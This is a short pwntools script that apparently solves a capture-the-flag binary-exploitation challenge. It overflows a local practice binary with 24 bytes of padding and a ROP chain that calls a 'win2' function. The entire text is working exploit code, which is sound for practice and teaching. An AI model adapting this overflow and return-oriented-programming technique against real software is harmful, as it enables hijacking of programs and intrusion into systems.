from pwn import *

exe = './binex_8'
elf = context.binary = ELF(exe, checksec=True)
rop = ROP(exe)
context.log_level = 'debug'

io = process(exe)

offset = b'A'*24

payload = flat([
    offset,
    rop.rdi.address,
    0x400795, 
    rop.ret.address,
    elf.sym['win2']
])

io.sendline(payload)
io.interactive()